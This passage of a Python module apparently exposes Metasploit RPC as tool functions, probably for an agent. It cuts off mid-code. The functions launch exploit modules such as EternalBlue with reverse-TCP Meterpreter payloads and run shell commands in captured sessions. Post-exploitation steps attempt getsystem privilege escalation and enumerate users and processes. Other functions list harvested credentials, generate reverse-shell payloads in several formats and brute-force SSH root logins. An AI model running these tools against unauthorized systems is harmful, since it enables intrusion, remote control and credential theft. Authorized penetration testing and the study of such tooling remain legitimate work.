                "latency_ms": elapsed,
                "host": self.host,
                "port": self.port,
                "ssl": self.ssl,
                "authenticated": self._authenticated,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
        except Exception as e:
            return {
                "alive": False,
                "error": str(e),
                "host": self.host,
                "port": self.port,
                "ssl": self.ssl,
                "authenticated": self._authenticated,
                "latency_ms": None,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }

    async def close(self):
        try:
            await self._client.aclose()
        except Exception:
            pass


_CLIENT: Optional[MsfrpcClient] = None
_CLIENT_LOCK = asyncio.Lock()


async def get_client(
    host: Optional[str] = None,
    port: Optional[int] = None,
    password: Optional[str] = None,
    ssl: Optional[bool] = None,
    username: Optional[str] = None,
    force_new: bool = False,
) -> MsfrpcClient:
    if not msf_is_installed():
        raise MsfrpcConnectionError(
            "Metasploit is not installed on this system. "
            "Install it from https://www.metasploit.com/"
        )
    global _CLIENT
    if force_new or _CLIENT is None:
        async with _CLIENT_LOCK:
            if force_new or _CLIENT is None:
                if _CLIENT is not None:
                    try:
                        await _CLIENT.close()
                    except Exception:
                        pass
                _CLIENT = MsfrpcClient(
                    host=host or MSF_HOST,
                    port=port or MSF_PORT,
                    password=password or MSF_PASS,
                    username=username or MSF_USER,
                    ssl=ssl if ssl is not None else MSF_SSL,
                )
                try:
                    await _CLIENT.login()
                except Exception:
                    pass
    return _CLIENT


async def close_client():
    global _CLIENT
    async with _CLIENT_LOCK:
        if _CLIENT is not None:
            try:
                await _CLIENT.close()
            except Exception:
                pass
            _CLIENT = None


# ═══════════════════════════════════════════════════════════════════════════════
# Tool Functions
# ═══════════════════════════════════════════════════════════════════════════════

async def msf_connect(
    host: Optional[str] = None,
    port: Optional[int] = None,
    password: Optional[str] = None,
    ssl: Optional[bool] = None,
) -> dict[str, Any]:
    """Connect to the Metasploit RPC daemon (msfrpd) and authenticate.

    Args:
        host: msfrpd hostname/IP (default: MSF_HOST env or 127.0.0.1)
        port: msfrpd port (default: MSF_PORT env or 55553)
        password: RPC password (default: MSF_PASS env or "msf")
        ssl: Use HTTPS (default: MSF_SSL env or False)

    Returns:
        Dict with success, token, host, port, and server version.
    """
    if not msf_is_installed():
        return {
            "success": False,
            "error": "Metasploit is not installed on this system. Install it from https://www.metasploit.com/",
            "tool": "msf_connect",
            "host": host or MSF_HOST,
            "port": port or MSF_PORT,
        }
    try:
        _ensure_httpx()
        _ensure_msgpack()
    except RuntimeError as e:
        return {"success": False, "error": str(e), "tool": "msf_connect"}
    try:
        h = host or MSF_HOST
        p = port or MSF_PORT
        pw = password or MSF_PASS
        use_ssl = ssl if ssl is not None else MSF_SSL
        client = await get_client(host=h, port=p, password=pw, ssl=use_ssl, force_new=True)
        try:
            version = await client.core_version()
        except Exception:
            version = {"version": "unknown"}
        return {
            "success": True,
            "token": client.token[:16] + "..." if client.token else "",
            "host": h,
            "port": p,
            "ssl": use_ssl,
            "version": version.get("version", "unknown"),
            "ruby": version.get("ruby", ""),
            "api": version.get("api", ""),
            "message": "Connected and authenticated to Metasploit RPC",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcAuthError as e:
        return {"success": False, "error": f"Authentication failed: {e}", "tool": "msf_connect"}
    except MsfrpcConnectionError as e:
        return {"success": False, "error": f"Connection failed: {e}", "tool": "msf_connect"}
    except MsfrpcTimeoutError as e:
        return {"success": False, "error": f"Connection timed out: {e}", "tool": "msf_connect"}
    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {e}", "tool": "msf_connect"}


async def msf_status() -> dict[str, Any]:
    """Check if the Metasploit RPC daemon is running and responsive.

    Returns:
        Dict with alive status, version info, latency, and connection details.
    """
    try:
        client = await get_client()
        return await client.health_check()
    except MsfrpcConnectionError as e:
        return {
            "alive": False,
            "error": str(e),
            "host": MSF_HOST,
            "port": MSF_PORT,
            "ssl": MSF_SSL,
            "authenticated": False,
            "latency_ms": None,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except Exception as e:
        return {
            "alive": False,
            "error": f"Status check failed: {e}",
            "host": MSF_HOST,
            "port": MSF_PORT,
            "ssl": MSF_SSL,
            "authenticated": False,
            "latency_ms": None,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }


async def msf_console_exec(command: str, timeout: float = 60.0) -> dict[str, Any]:
    """Execute a command in a Metasploit console session.

    Creates a temporary console, runs the command, captures output,
    and destroys the console.

    Args:
        command: The msfconsole command to execute (e.g. "route print", "use exploit/...")
        timeout: Maximum seconds to wait for command completion (default 60)

    Returns:
        Dict with console output, command, duration, and truncation status.
    """
    if not command or not command.strip():
        return {"error": "No command provided", "tool": "msf_console_exec"}
    try:
        client = await get_client()
        result = await client.console_execute_command(command.strip(), timeout=timeout)
        return {
            "success": True,
            "output": result.get("output", ""),
            "command": result.get("command", command),
            "console_id": result.get("console_id", ""),
            "duration_seconds": result.get("duration_seconds", 0),
            "truncated": result.get("truncated", False),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcConnectionError as e:
        return {"error": f"RPC connection error: {e}", "tool": "msf_console_exec"}
    except MsfrpcTimeoutError as e:
        return {"error": f"Console command timed out: {e}", "command": command, "tool": "msf_console_exec"}
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "command": command, "tool": "msf_console_exec"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "command": command, "tool": "msf_console_exec"}


async def msf_search(query: str) -> dict[str, Any]:
    """Search Metasploit modules by name or path.

    Searches across all module types (exploit, auxiliary, post, payload).

    Args:
        query: Search string to match against module names/paths

    Returns:
        Dict with count of matches, results list, and query metadata.
    """
    if not msf_is_installed():
        return {"error": "Metasploit is not installed on this system. Install from https://www.metasploit.com/", "tool": "msf_search"}
    if not query or not query.strip():
        return {"error": "No search query provided", "tool": "msf_search"}
    try:
        client = await get_client()
        result = await client.module_search(query.strip())
        return {
            "success": True,
            "query": result.get("query", query),
            "count": result.get("count", 0),
            "results": result.get("results", []),
            "truncated": result.get("truncated", False),
            "timestamp": result.get("timestamp", datetime.now(timezone.utc).isoformat()),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit search error: {e}", "query": query, "tool": "msf_search"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "query": query, "tool": "msf_search"}


async def msf_module_info(module_path: str) -> dict[str, Any]:
    """Get detailed information about a Metasploit module.

    Includes options, targets, actions, references, and metadata.

    Args:
        module_path: Full module path (e.g. "exploit/windows/smb/ms17_010_eternalblue")
                     or partial name (e.g. "ms17_010_eternalblue")

    Returns:
        Dict with module metadata, options, targets, actions, and references.
    """
    if not module_path or not module_path.strip():
        return {"error": "No module path provided", "tool": "msf_module_info"}
    try:
        client = await get_client()
        info = await client.module_info(module_path.strip())
        return {
            "success": True,
            "module": info.get("fullname", module_path),
            "name": info.get("name", ""),
            "description": info.get("description", ""),
            "type": info.get("type", ""),
            "author": info.get("author", []),
            "rank": info.get("rank", 0),
            "rank_name": info.get("rank_name", ""),
            "license": info.get("license", ""),
            "platform": info.get("platform", ""),
            "arch": info.get("arch", ""),
            "disclosure_date": info.get("disclosure_date", ""),
            "references": info.get("references", []),
            "targets": info.get("targets", []),
            "actions": info.get("actions", []),
            "options": info.get("options", {}),
            "default_target": info.get("default_target", 0),
            "default_action": info.get("default_action", ""),
            "privileged": info.get("privileged", False),
            "check": info.get("check", False),
            "stance": info.get("stance", ""),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "module": module_path, "tool": "msf_module_info"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "module": module_path, "tool": "msf_module_info"}


async def msf_exploit_run(
    target: str,
    module: str,
    payload: Optional[str] = None,
    options: Optional[dict[str, Any]] = None,
    lhost: Optional[str] = None,
    lport: Optional[int] = None,
    job_run: bool = True,
) -> dict[str, Any]:
    """Run a Metasploit exploit module against a target.

    Configures RHOSTS, LHOST, LPORT and runs the exploit.

    Args:
        target: Target IP address or hostname
        module: Exploit module path (e.g. "exploit/windows/smb/ms17_010_eternalblue")
        payload: Payload to use (e.g. "windows/x64/meterpreter/reverse_tcp")
        options: Additional module options as dict
        lhost: Local IP for reverse connections (default: auto-detected)
        lport: Local port for reverse connections
        job_run: Run as background job (default True)

    Returns:
        Dict with job_id, module info, and execution status.
    """
    if not target:
        return {"error": "No target provided", "tool": "msf_exploit_run"}
    if not module:
        return {"error": "No module provided", "tool": "msf_exploit_run"}
    try:
        client = await get_client()
        sanitized = _sanitize_host(target)
        opts: dict[str, Any] = {"RHOSTS": sanitized}
        if options:
            opts.update(options)
        if lhost:
            opts["LHOST"] = lhost
        if lport:
            opts["LPORT"] = str(lport)
        if "LHOST" not in opts:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                auto_lhost = s.getsockname()[0]
                s.close()
                opts["LHOST"] = auto_lhost
            except Exception:
                opts["LHOST"] = "0.0.0.0"

        full_module = _format_module_path("exploit", module)
        result = await client.module_execute(
            module_type="exploit",
            module_path=full_module,
            options=opts,
            payload=payload,
            job_run=job_run,
        )
        resp: dict[str, Any] = {
            "success": result.get("success", False),
            "target": sanitized,
            "module": full_module,
            "payload": payload,
            "job_id": result.get("job_id"),
            "message": result.get("message", ""),
            "options_used": opts,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        if result.get("job_id") is not None:
            resp["job_id"] = result["job_id"]
        return resp
    except MsfrpcConnectionError as e:
        return {"error": f"RPC connection error: {e}", "tool": "msf_exploit_run", "target": target, "module": module}
    except MsfrpcError as e:
        return {"error": f"Metasploit exploit error: {e}", "target": target, "module": module, "tool": "msf_exploit_run"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "target": target, "module": module, "tool": "msf_exploit_run"}


async def msf_auxiliary_run(
    target: str,
    module: str,
    options: Optional[dict[str, Any]] = None,
    action: Optional[str] = None,
    job_run: bool = True,
) -> dict[str, Any]:
    """Run a Metasploit auxiliary module against a target.

    Used for scanning, discovery, and information gathering.

    Args:
        target: Target IP, range (e.g. "192.168.1.0/24"), or hostname
        module: Auxiliary module path (e.g. "auxiliary/scanner/portscan/tcp")
        options: Additional module options as dict
        action: Module action to run (if the module supports actions)
        job_run: Run as background job (default True)

    Returns:
        Dict with job_id, module info, and execution status.
    """
    if not target:
        return {"error": "No target provided", "tool": "msf_auxiliary_run"}
    if not module:
        return {"error": "No module provided", "tool": "msf_auxiliary_run"}
    try:
        client = await get_client()
        sanitized = _sanitize_host(target)
        opts: dict[str, Any] = {"RHOSTS": sanitized}
        if options:
            opts.update(options)
        if action:
            opts["ACTION"] = action

        full_module = _format_module_path("auxiliary", module)
        result = await client.module_execute(
            module_type="auxiliary",
            module_path=full_module,
            options=opts,
            job_run=job_run,
        )
        resp: dict[str, Any] = {
            "success": result.get("success", False),
            "target": sanitized,
            "module": full_module,
            "action": action,
            "job_id": result.get("job_id"),
            "message": result.get("message", ""),
            "options_used": opts,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        if result.get("job_id") is not None:
            resp["job_id"] = result["job_id"]
        return resp
    except MsfrpcConnectionError as e:
        return {"error": f"RPC connection error: {e}", "tool": "msf_auxiliary_run", "target": target, "module": module}
    except MsfrpcError as e:
        return {"error": f"Metasploit auxiliary error: {e}", "target": target, "module": module, "tool": "msf_auxiliary_run"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "target": target, "module": module, "tool": "msf_auxiliary_run"}


async def msf_sessions_list() -> dict[str, Any]:
    """List all active Metasploit sessions.

    Returns detailed information about each session including type,
    target host/port, platform, and exploit used.

    Returns:
        Dict with count of sessions and a dict of session details keyed by session ID.
    """
    try:
        client = await get_client()
        result = await client.session_list()
        return {
            "success": True,
            "count": result.get("count", 0),
            "sessions": result.get("sessions", {}),
            "timestamp": result.get("timestamp", datetime.now(timezone.utc).isoformat()),
        }
    except MsfrpcConnectionError as e:
        return {"error": f"RPC connection error: {e}", "tool": "msf_sessions_list"}
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_sessions_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_sessions_list"}


async def msf_session_details(session_id: str) -> dict[str, Any]:
    """Get detailed information about a specific Metasploit session.

    Args:
        session_id: The numeric session ID

    Returns:
        Dict with session metadata, or error if session not found.
    """
    if not session_id:
        return {"error": "No session ID provided", "tool": "msf_session_details"}
    try:
        client = await get_client()
        result = await client.session_list()
        sessions = result.get("sessions", {})
        sid = str(session_id)
        info = sessions.get(sid)
        if not info:
            for k, v in sessions.items():
                if str(v.get("id", "")) == sid:
                    info = v
                    break
        if not info:
            return {"error": f"Session {session_id} not found", "session_id": session_id, "tool": "msf_session_details"}
        return {
            "success": True,
            "session_id": sid,
            "info": info,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcConnectionError as e:
        return {"error": f"RPC connection error: {e}", "tool": "msf_session_details", "session_id": session_id}
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_session_details", "session_id": session_id}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_session_details", "session_id": session_id}


async def msf_session_shell(session_id: str, command: str) -> dict[str, Any]:
    """Execute a system command in an active Metasploit session.

    Automatically detects if the session is a shell or meterpreter session
    and uses the appropriate RPC method.

    Args:
        session_id: The numeric session ID
        command: The command to execute on the target

    Returns:
        Dict with command output, session ID, and execution metadata.
    """
    if not session_id:
        return {"error": "No session ID provided", "tool": "msf_session_shell"}
    if not command or not command.strip():
        return {"error": "No command provided", "tool": "msf_session_shell"}
    try:
        client = await get_client()
        result = await client.session_shell_execute(session_id, command.strip())
        return {
            "success": True,
            "session_id": result.get("session_id", session_id),
            "command": result.get("command", command),
            "output": result.get("output", ""),
            "duration_seconds": result.get("duration_seconds", 0),
            "truncated": result.get("truncated", False),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcConnectionError as e:
        return {"error": f"RPC connection error: {e}", "tool": "msf_session_shell", "session_id": session_id}
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_session_shell", "session_id": session_id}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_session_shell", "session_id": session_id}


async def msf_payload_generate(
    payload: str,
    lhost: str,
    lport: int,
    format: str = "raw",
    arch: Optional[str] = None,
    platform: Optional[str] = None,
    encoder: Optional[str] = None,
) -> dict[str, Any]:
    """Generate a Metasploit payload binary.

    Args:
        payload: Payload module path (e.g. "windows/x64/meterpreter/reverse_tcp")
        lhost: Local host/IP for the reverse connection
        lport: Local port for the reverse connection
        format: Output format: raw, exe, dll, psh, python, bash, etc.
        arch: Target architecture (e.g. "x64", "x86")
        platform: Target platform (e.g. "windows", "linux")
        encoder: Optional encoder to use

    Returns:
        Dict with generated payload (hex-encoded), size, and metadata.
    """
    if not payload:
        return {"error": "No payload specified", "tool": "msf_payload_generate"}
    if not lhost:
        return {"error": "No LHOST specified", "tool": "msf_payload_generate"}
    if not lport:
        return {"error": "No LPORT specified", "tool": "msf_payload_generate"}
    valid_formats = {"raw", "exe", "dll", "psh", "python", "bash", "c", "perl", "vba", "vbs", "asp", "war", "elf", "macho"}
    fmt = format if format in valid_formats else "raw"
    try:
        client = await get_client()
        result = await client.payload_generate(
            payload=payload,
            lhost=lhost,
            lport=lport,
            format=fmt,
            arch=arch,
            platform=platform,
            encoder=encoder,
        )
        raw_hex = result.get("payload", "")
        size_bytes = len(bytes.fromhex(raw_hex)) if raw_hex and isinstance(raw_hex, str) else 0
        return {
            "success": True,
            "payload_module": payload,
            "lhost": lhost,
            "lport": lport,
            "format": fmt,
            "arch": arch,
            "platform": platform,
            "encoder": encoder,
            "payload_hex": raw_hex,
            "size_bytes": size_bytes,
            "size_kb": round(size_bytes / 1024, 2) if size_bytes else 0,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit payload error: {e}", "tool": "msf_payload_generate"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_payload_generate"}


async def msf_workspace_create(name: str) -> dict[str, Any]:
    """Create a new Metasploit workspace.

    Workspaces isolate different projects/targets in the database.

    Args:
        name: Name for the new workspace

    Returns:
        Dict with workspace creation status and details.
    """
    if not name or not name.strip():
        return {"error": "No workspace name provided", "tool": "msf_workspace_create"}
    try:
        client = await get_client()
        try:
            existing = await client.db_get_workspace(name.strip())
            if existing.get("id") or existing.get("name"):
                return {
                    "success": True,
                    "workspace": name.strip(),
                    "message": "Workspace already exists",
                    "details": existing,
                    "created": False,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                }
        except MsfrpcError:
            pass
        cmd = f"workspace -a {name.strip()}"
        result = await client.console_execute_command(cmd, timeout=15.0)
        output = result.get("output", "")
        success = "added" in output.lower() or "created" in output.lower() or "workspace" in output.lower()
        return {
            "success": success,
            "workspace": name.strip(),
            "message": output.strip() or f"Workspace '{name}' created via console",
            "output": output,
            "created": True,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_workspace_create", "name": name}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_workspace_create", "name": name}


async def msf_workspace_list() -> dict[str, Any]:
    """List all Metasploit workspaces.

    Returns:
        Dict with a list of workspaces and their metadata.
    """
    try:
        client = await get_client()
        workspaces = await client.db_workspaces()
        active = None
        for ws in workspaces:
            if ws.get("name") and not active:
                active = ws["name"]
        return {
            "success": True,
            "count": len(workspaces),
            "workspaces": workspaces,
            "active_workspace": active,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_workspace_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_workspace_list"}


async def msf_hosts_list(workspace: Optional[str] = None) -> dict[str, Any]:
    """List discovered hosts in the Metasploit database.

    Args:
        workspace: Optional workspace to filter by

    Returns:
        Dict with list of hosts and their metadata (OS, services, vuln counts).
    """
    try:
        client = await get_client()
        hosts = await client.db_hosts(workspace=workspace)
        return {
            "success": True,
            "count": len(hosts),
            "hosts": hosts,
            "workspace": workspace or "default",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_hosts_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_hosts_list"}


async def msf_vulns_list(workspace: Optional[str] = None) -> dict[str, Any]:
    """List vulnerabilities in the Metasploit database.

    Args:
        workspace: Optional workspace to filter by

    Returns:
        Dict with list of vulnerabilities, their host, port, and references.
    """
    try:
        client = await get_client()
        vulns = await client.db_vulns(workspace=workspace)
        return {
            "success": True,
            "count": len(vulns),
            "vulnerabilities": vulns,
            "workspace": workspace or "default",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_vulns_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_vulns_list"}


async def msf_creds_list(workspace: Optional[str] = None) -> dict[str, Any]:
    """List discovered credentials in the Metasploit database.

    Args:
        workspace: Optional workspace to filter by

    Returns:
        Dict with list of credentials (username, password, host, port).
    """
    try:
        client = await get_client()
        creds = await client.db_creds(workspace=workspace)
        return {
            "success": True,
            "count": len(creds),
            "credentials": creds,
            "workspace": workspace or "default",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_creds_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_creds_list"}


async def metasploit_exploit(
    target: str,
    module: str,
    payload: Optional[str] = None,
) -> dict[str, Any]:
    """High-level exploit function that runs an exploit and monitors for sessions.

    This is a convenience wrapper around msf_exploit_run that additionally
    monitors job completion and session creation.

    Args:
        target: Target IP address or hostname
        module: Exploit module path (e.g. "exploit/windows/smb/ms17_010_eternalblue")
        payload: Optional payload (e.g. "windows/x64/meterpreter/reverse_tcp")

    Returns:
        Dict with exploit result, job status, and any new sessions.
    """
    result = await msf_exploit_run(target=target, module=module, payload=payload)
    if result.get("error"):
        return result
    job_id = result.get("job_id")
    sessions_before = await msf_sessions_list()
    before_count = sessions_before.get("count", 0)
    if job_id is not None:
        await asyncio.sleep(3)
        try:
            client = await get_client()
            for _ in range(10):
                await asyncio.sleep(2)
                try:
                    jobs = await client.job_list()
                    jobs_dict = jobs.get("jobs", {})
                    if str(job_id) not in jobs_dict:
                        break
                except Exception:
                    break
        except Exception:
            pass
    await asyncio.sleep(1)
    sessions_after = await msf_sessions_list()
    after_count = sessions_after.get("count", 0)
    new_sessions: dict[str, Any] = {}
    if after_count > before_count:
        all_sessions = sessions_after.get("sessions", {})
        before_sessions = sessions_before.get("sessions", {})
        for sid, sinfo in all_sessions.items():
            if sid not in before_sessions:
                new_sessions[sid] = sinfo
    return {
        "success": result.get("success", False),
        "target": target,
        "module": module,
        "payload": payload,
        "job_id": job_id,
        "message": result.get("message", ""),
        "sessions_created": len(new_sessions),
        "new_sessions": new_sessions,
        "total_sessions": after_count,
        "options_used": result.get("options_used", {}),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


async def metasploit_scan(target: str, scan_type: str = "default") -> dict[str, Any]:
    """High-level scan function that runs appropriate auxiliary modules.

    Selects and runs Metasploit auxiliary scanner modules based on the
    requested scan type.

    Args:
        target: Target IP, CIDR range, or hostname
        scan_type: Type of scan to perform:
            - "default": Port scanning + service detection
            - "quick": Fast common port scan
            - "full": Full port range scan (1-65535)
            - "smb": SMB-specific scanning
            - "http": HTTP/HTTPS web scanning
            - "ssh": SSH scanning
            - "mysql": MySQL database scanning
            - "mssql": MSSQL database scanning
            - "vuln": Vulnerability scanning

    Returns:
        Dict with scan results, modules run, and discovered services.
    """
    scan_configs: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
        "default": [
            ("auxiliary/scanner/portscan/tcp", "TCP port scan", {"PORTS": "1-1024,3306,3389,5432,5900,8080,8443,27017"}),
            ("auxiliary/scanner/portscan/ack", "ACK scan", {"PORTS": "80,443,22,21,3389"}),
        ],
        "quick": [
            ("auxiliary/scanner/portscan/tcp", "Quick TCP scan", {"PORTS": "21,22,23,25,53,80,110,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,27017", "TIMEOUT": "500"}),
        ],
        "full": [
            ("auxiliary/scanner/portscan/tcp", "Full TCP scan", {"PORTS": "1-65535", "TIMEOUT": "2000"}),
        ],
        "smb": [
            ("auxiliary/scanner/smb/smb_version", "SMB version detection", {}),
            ("auxiliary/scanner/smb/smb_enumshares", "SMB share enumeration", {}),
            ("auxiliary/scanner/smb/smb_login", "SMB login check", {}),
            ("auxiliary/scanner/smb/pipe_auditor", "SMB pipe auditor", {}),
        ],
        "http": [
            ("auxiliary/scanner/http/http_version", "HTTP version detection", {}),
            ("auxiliary/scanner/http/http_title", "HTTP title grabber", {}),
            ("auxiliary/scanner/http/robots_txt", "Robots.txt scanner", {}),
            ("auxiliary/scanner/http/dir_scanner", "Directory scanner", {"DICTIONARY": "/usr/share/metasploit-framework/data/wmap/wmap_dirs.txt"}),
        ],
        "ssh": [
            ("auxiliary/scanner/ssh/ssh_version", "SSH version detection", {}),
            ("auxiliary/scanner/ssh/ssh_login", "SSH login check", {"USERNAME": "root", "PASS_FILE": "/usr/share/metasploit-framework/data/wordlists/root_userpass.txt"}),
        ],
        "mysql": [
            ("auxiliary/scanner/mysql/mysql_version", "MySQL version", {}),
            ("auxiliary/scanner/mysql/mysql_login", "MySQL login", {}),
            ("auxiliary/scanner/mysql/mysql_enum", "MySQL enumeration", {}),
        ],
        "mssql": [
            ("auxiliary/scanner/mssql/mssql_ping", "MSSQL ping", {}),
            ("auxiliary/scanner/mssql/mssql_login", "MSSQL login", {}),
            ("auxiliary/scanner/mssql/mssql_enum", "MSSQL enumeration", {}),
        ],
        "vuln": [
            ("auxiliary/scanner/portscan/tcp", "TCP pre-scan", {"PORTS": "21,22,23,80,443,445,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017"}),
            ("auxiliary/scanner/smb/smb_ms17_010", "MS17-010 SMB check", {}),
            ("auxiliary/scanner/ssl/ssl_version", "SSL version check", {}),
            ("auxiliary/scanner/ssl/ssl_heartbleed", "Heartbleed check", {}),
        ],
    }
    if scan_type not in scan_configs:
        return {"error": f"Unknown scan type '{scan_type}'. Available: {', '.join(scan_configs.keys())}", "tool": "metasploit_scan"}
    modules_to_run = scan_configs[scan_type]
    results: list[dict[str, Any]] = []
    total_modules = len(modules_to_run)
    completed = 0
    failed = 0
    for mod_path, mod_desc, extra_opts in modules_to_run:
        try:
            scan_result = await msf_auxiliary_run(
                target=target,
                module=mod_path,
                options=extra_opts if extra_opts else None,
                job_run=False,
            )
            if scan_result.get("error"):
                results.append({
                    "module": mod_path,
                    "description": mod_desc,
                    "status": "failed",
                    "error": scan_result["error"],
                })
                failed += 1
            else:
                results.append({
                    "module": mod_path,
                    "description": mod_desc,
                    "status": "completed",
                    "message": scan_result.get("message", ""),
                })
                completed += 1
        except Exception as e:
            results.append({
                "module": mod_path,
                "description": mod_desc,
                "status": "error",
                "error": str(e),
            })
            failed += 1
    services: list[dict[str, Any]] = []
    hosts: list[dict[str, Any]] = []
    try:
        hosts_result = await msf_hosts_list()
        if hosts_result.get("success"):
            hosts = hosts_result.get("hosts", [])
    except Exception:
        pass
    try:
        services_raw = await msf_sessions_list()
        if services_raw.get("success"):
            pass
    except Exception:
        pass
    try:
        client = await get_client()
        db_services = await client.db_services()
        services = db_services
    except Exception:
        pass
    return {
        "success": True,
        "target": target,
        "scan_type": scan_type,
        "total_modules": total_modules,
        "completed": completed,
        "failed": failed,
        "module_results": results,
        "discovered_services": services[:50] if services else [],
        "discovered_hosts": hosts,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


async def metasploit_post_exploit(session_id: str) -> dict[str, Any]:
    """Perform post-exploitation actions on an active session.

    Runs system information gathering, privilege escalation checks,
    and enumeration modules on the target.

    Args:
        session_id: The active session ID to work with

    Returns:
        Dict with post-exploitation results including system info,
        user context, network config, and session details.
    """
    if not session_id:
        return {"error": "No session ID provided", "tool": "metasploit_post_exploit"}
    sid = session_id
    post_results: dict[str, Any] = {}

    session_info = await msf_session_details(sid)
    if session_info.get("error"):
        return session_info
    post_results["session_info"] = session_info.get("info", {})

    session_type = str(session_info.get("info", {}).get("type", "")).lower()
    is_meterpreter = "meterpreter" in session_type

    try:
        sysinfo = await msf_session_shell(sid, "sysinfo" if is_meterpreter else "systeminfo")
        post_results["system_info"] = sysinfo.get("output", "")
    except Exception as e:
        post_results["system_info"] = f"Error: {e}"

    try:
        user_cmd = "getuid" if is_meterpreter else "whoami"
        whoami = await msf_session_shell(sid, user_cmd)
        post_results["user_context"] = whoami.get("output", "")
    except Exception as e:
        post_results["user_context"] = f"Error: {e}"

    try:
        network_cmd = "ipconfig" if is_meterpreter else "ipconfig /all"
        network = await msf_session_shell(sid, network_cmd)
        post_results["network_config"] = network.get("output", "")
    except Exception as e:
        post_results["network_config"] = f"Error: {e}"

    try:
        routes = await msf_session_shell(sid, "route print" if not is_meterpreter else "route")
        post_results["routing_table"] = routes.get("output", "")
    except Exception as e:
        post_results["routing_table"] = f"Error: {e}"

    try:
        if is_meterpreter:
            check_cmd = "getsystem -t 0"
            priv_check = await msf_session_shell(sid, check_cmd)
            post_results["privilege_check"] = priv_check.get("output", "")
            try:
                enum_cmd = "run post/windows/gather/enum_logged_on_users"
                enum_users = await msf_session_shell(sid, enum_cmd)
                post_results["logged_on_users"] = enum_users.get("output", "")
            except Exception:
                pass
        else:
            whoami_priv = await msf_session_shell(sid, "whoami /priv")
            post_results["privilege_check"] = whoami_priv.get("output", "")
    except Exception as e:
        post_results["privilege_check"] = f"Error: {e}"

    try:
        processes = await msf_session_shell(sid, "ps" if is_meterpreter else "tasklist")
        post_results["process_list"] = processes.get("output", "")
    except Exception as e:
        post_results["process_list"] = f"Error: {e}"

    try:
        if is_meterpreter:
            desktop = await msf_session_shell(sid, "enumdesktops")
            post_results["desktops"] = desktop.get("output", "")
    except Exception:
        pass

    try:
        client = await get_client()
        compat_modules = await client.session_compatible_modules(sid)
        post_results["compatible_post_modules"] = [m.get("fullname", "") for m in compat_modules[:30]]
    except Exception:
        post_results["compatible_post_modules"] = []

    return {
        "success": True,
        "session_id": sid,
        "session_type": session_type,
        "is_meterpreter": is_meterpreter,
        "results": post_results,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


async def metasploit_payload_gen(lhost: str, lport: int) -> dict[str, Any]:
    """Generate multiple Metasploit payload formats for a given LHOST:LPORT.

    Produces payloads in multiple formats: raw, exe, psh, python, bash, c.

    Args:
        lhost: Local host/IP for reverse connections
        lport: Local port for reverse connections

    Returns:
        Dict with generated payloads in various formats and sizes.
    """
    if not lhost:
        return {"error": "No LHOST specified", "tool": "metasploit_payload_gen"}
    if not lport:
        return {"error": "No LPORT specified", "tool": "metasploit_payload_gen"}
    payload_modules: list[tuple[str, Optional[str], Optional[str]]] = [
        ("windows/x64/meterpreter/reverse_tcp", "x64", "windows"),
        ("windows/meterpreter/reverse_tcp", "x86", "windows"),
        ("linux/x64/meterpreter/reverse_tcp", "x64", "linux"),
        ("linux/x86/meterpreter/reverse_tcp", "x86", "linux"),
        ("python/meterpreter/reverse_tcp", None, "python"),
        ("php/meterpreter_reverse_tcp", None, "php"),
        ("java/meterpreter/reverse_tcp", None, "java"),
    ]
